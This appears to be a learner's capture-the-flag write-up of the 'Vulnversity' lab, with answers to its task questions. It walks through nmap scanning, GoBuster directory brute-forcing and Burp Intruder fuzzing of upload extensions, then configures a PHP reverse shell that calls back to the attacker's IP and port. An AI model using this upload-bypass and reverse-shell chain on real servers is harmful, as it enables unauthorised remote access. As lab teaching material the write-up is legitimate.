# Vulnversity
### Machines info
- Kali:	10.10.167.137
- Attacked machine: 10.10.225.214
## Task 2: Reconnaissance
I'm using *nmap* to answer all the questions from the taks.
Command: `nmap -sC -sV -A 10.10.225.214`
> Scan the box, how many ports are open?

```
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```
**Answer: 6**

> What version of the squid proxy is running on the machine?

`3128/tcp open  http-proxy  Squid http proxy 3.5.12`

**Answer: 3.5.12**

> How many ports will nmap scan if the flag **-p-400** was used?

**Answer: 400**

> Using the nmap flag **-n** what will it not resolve?

**Answer: DNS**

> What is the most likely operating system this machine is running?

**Answer: Ubuntu**

> What port is the web server running on?

**Answer: 3333**

The machine has its own Apache server running on 3333, so I checked if there is any website. On `http://10.10.225.214:3333` there is VULN UNIVERSITY site.
## Task 3: Locating directories using GoBuster
GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names.
**IMPORTANT: YOU CAN FIND EXAMPLE WORDLISTS IN `/usr/share/wordlists`**
```
root@ip-10-10-167-137:~# ls -l /usr/share/wordlists
total 1280968
drwxr-xr-x  5 root root       4096 May 28  2020 dirb
drwxr-xr-x  2 root root       4096 May 28  2020 dirbuster
-rw-r--r--  1 root root       2006 May 28  2020 fasttrack.txt
drwxr-xr-x  2 root root       4096 Sep 25  2021 MetasploitRoom
drwxr-xr-x  2 root root       4096 Aug  4  2021 PythonForPentesters
-rw-------  1 root root  139921497 Sep 23  2015 rockyou.txt
drwxr-xr-x 12 root root       4096 May 28  2020 SecLists
-rw-r--r--  1 root root 1171751585 Aug 15  2020 wordlists.zip
```
When I used *fasttrack.txt*, gobuster found nothing, so I decided to use *rockyou.txt*.
Command:
`gobuster dir -u http://10.10.225.214:3333 -e -w /usr/share/wordlists/rockyou.txt`

GoBuster found these URLs (there were much more but unrecognable for Firefox):
```
http://10.10.225.214:3333/images (Status: 301)
http://10.10.225.214:3333/internal (Status: 301)
```
The second one has a form for uploading, so...

> What is the directory that has an upload form page?

**Answer: /internal/**

## Task 4: Compromise the webserver
If I want to upload any of known extensions (e.g. exe, txt, php, js) the site says
> Extension not allowed.

Devs usually shouldn't want to allow people to upload and run scripts in language the website is written, so I wanted here to find out what language is used. Firstly, I noticed that after the uploading a file the URL is changing to `.../internal/index.php`, which is the answer. 
> What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out.

**Answer: .php**

Ofc it shows also in Burp. I've used *FoxyProxy* to send the traffic to Burp Proxy, where I got info:
```
POST /internal/index.php HTTP/1.1
Host: 10.10.225.214:3333
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------36228835421868687684821620146
Content-Length: 339
Origin: http://10.10.225.214:3333
Connection: close
Referer: http://10.10.225.214:3333/internal/index.php
Upgrade-Insecure-Requests: 1

-----------------------------36228835421868687684821620146
Content-Disposition: form-data; name="file"; filename="a.php"
```

I sent it to Intruder tab.
Next step is creating a file with PHP extensions:
```
root@ip-10-10-167-137:~/Desktop# echo -e ".php\n.php3\n.php4\n.php5\n.phtml" >> ext_php.txt
root@ip-10-10-167-137:~/Desktop# cat ext_php.txt 
.php
.php3
.php4
.php5
.phtml
```

I'll use them as payload list and put it there in Positions code:

```
Content-Disposition: form-data; name="file"; filename="a§.php§"
```
which takes elements from the payloads list as variable to the place between "§".

**IMPORTANT: UNCHECK THE ENCODING ON THE BOTOOM OF THE PAYLOADS TAB!**

For the *.phtml* we got response with "Success"
```
(...)
		   <input class="btn btn-primary" type="submit" value="Submit" name="submit">
		</form>
		Success
	</body>
</html>
```
> Run this attack, what extension is allowed?

**Answer: .phtml**

Remember about turning off *FoxyProxy* after all.

Now we can use that extension to upload reverse shell. We can find it in `/usr/share/webshells/php/php-reverse-shell.php`
```
root@ip-10-10-167-137:~/Desktop# sudo find / -name php*reverse*
find: \u2018/run/user/115/gvfs\u2019: Permission denied
find: \u2018/proc/10245\u2019: No such file or directory
find: \u2018/proc/10246\u2019: No such file or directory
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
```
Just copy it anywhere, edit the IP address in the file and upload with *.phtml* extension.

Variables should look like that:
```
$VERSION = "1.0";
$ip = '10.10.167.137';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

After uploading you will be allowed to use this reverse shell with NetCat.
